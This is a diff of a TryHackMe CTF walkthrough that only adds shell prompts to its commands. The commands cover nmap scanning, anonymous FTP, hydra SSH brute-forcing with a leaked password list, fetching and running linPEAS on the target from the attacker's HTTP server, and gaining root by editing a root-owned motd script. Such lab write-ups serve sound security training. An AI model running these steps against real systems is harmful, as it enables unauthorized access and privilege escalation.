@@ -17,7 +17,7 @@ Deploy the machine by clicking the **Deploy** button.
 After the machine has finished booting up, run the following command to reveal the open ports on the network (If using personal Linux machine, remember to use **OpenVPN**):
 
 ```
-nmap -sV -sC -Pn
+$ nmap -sV -sC -Pn
 ```
 
 After nmap is finished scanning, our output shows three open ports:
@@ -35,7 +35,7 @@ Hint: Have you visited ftp?
 Thanks to this hint, we know to use the ftp server that we found in the nmap scan. So for this to work, we need to use the following command:
 
 ```
-ftp ${MachineIP}
+$ ftp ${MachineIP}
 ```
 
 To log into the ftp server, we will be using the **anonymous** username to access the ftp server. This was mentioned in the nmap scan.
@@ -43,7 +43,7 @@ To log into the ftp server, we will be using the **anonymous** username to acces
 After searching around the ftp, we find a file within the **dir** directory. We notice there's a text file called **task.txt**. We can view this file directly in the ftp terminal using the following command:
 
 ```
-get task.txt -
+$ get task.txt -
 ```
 
 We now have our username!
@@ -51,7 +51,7 @@ We now have our username!
 After finding this **task.txt** file, we will notice there is another file called **locks.txt**, and it looks like a bunch of strange passwords. Let's use the get command again to save this on our machine for a future task.
 
 ```
-get locks.txt
+$ get locks.txt
 ```
 
 # Task 4
@@ -71,7 +71,7 @@ Remember that **locks.txt** file we discovered earlier in the ftp? It's now time
 Since the question mentions hydra, we are going to be using this command to find any available passwords for the user:
 
 ```
-hydra -t 4 -V -l ${User} -P /usr/share/wordlists/locks.txt ssh://${machineIP}
+$ hydra -t 4 -V -l ${User} -P /usr/share/wordlists/locks.txt ssh://${machineIP}
 ```
 
 Now that we've obtained the password, let's move on to finding the user.txt file for task 6!
@@ -81,7 +81,7 @@ Now that we've obtained the password, let's move on to finding the user.txt file
 To begin accessing the system, we have to ssh in with our credentials. We can use the following command to gain access:
 
 ```
-ssh ${user}@${MachineIP}
+$ ssh ${user}@${MachineIP}
 ```
 
 We're in!
@@ -89,7 +89,7 @@ We're in!
 We can also run this within the targets terminal to see if we have root privileges:
 
 ```
-sudo -l
+$ sudo -l
 ```
 
 After we run a simple command to see the available items in the directory, we see the **user.txt** file, which has our first flag!
@@ -97,8 +97,8 @@ After we run a simple command to see the available items in the directory, we se
 Commands:
 
 ```
-ls
-cat user.txt
+$ ls
+$ cat user.txt
 ```
 
 # Task 7
@@ -108,7 +108,7 @@ All that's left is to find the **root.txt** and complete the CTF!
 The easiest way to accomplish this is by using **linPEAS** & a **python server**, so we're gonna start by getting a python server up and running with this command (Remember to do this in your root terminal, not as the user!):
 
 ```
-sudo python3 -m http.server 80
+$ sudo python3 -m http.server 80
 ```
 
 Now to actually obtain the script. We need to create a directory (I called mine LinEnum), wget the actual linPEAS script from the GitHub repository, and then transfer the file over to the target machine to run the exploit.
@@ -116,9 +116,9 @@ Now to actually obtain the script. We need to create a directory (I called mine 
 Here are the commands I used (This can be done multiple ways):
 
 ```
-mkdir LinEnum
-cd LinEnum
-wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
+$ mkdir LinEnum
+$ cd LinEnum
+$ wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
 ```
 
 Now we need to move back over to the users terminal, and we now have it saved on our server, so let's move it over to the target machine (Remember to use this command in the target's terminal).
@@ -126,19 +126,19 @@ Now we need to move back over to the users terminal, and we now have it saved on
 Note: If using the THM cloud Kali Linux machine, the PrivateIP is available [here](https://tryhackme.com/my-machine).
 
 ```
-wget "http://${PrivateIP}/linpeas.sh"
+$ wget "http://${PrivateIP}/linpeas.sh"
 ```
 
 To make our **linPEAS** script executable, we simply do this command (Notice the color change when we run this command):
 
 ```
-chmod +x linpeas.sh
+$ chmod +x linpeas.sh
 ```
 
 **Time to run the script!**
 
 ```
-./linpeas.sh
+$ ./linpeas.sh
 ```
 
 After a few minutes, the script should finish running on the target machine. After sifting through all the returned results, we see a file called **/etc/update-motd.d/00-header** (Notice how it's highlighted).
@@ -155,7 +155,7 @@ This will show us that the **00-header** file we found is actually owned by root
 The easiest way to do this is by using **nano**:
 
 ```
-nano 00-header
+$ nano 00-header
 ```
 
 Now that we have the file open, let's edit the file so that the next time we log in through **ssh**, we will see the **root.txt**!
@@ -171,7 +171,7 @@ cat /root/root.txt
 After completing all the above tasks, all we have to do is log out of the ssh shell and log back in. You'll see the **root.txt** flag is located directly in the login terminal screen!
 
 ```
-ssh ${user}@${MachineIP}
+$ ssh ${user}@${MachineIP}
 ```
 
 # Congratulations!
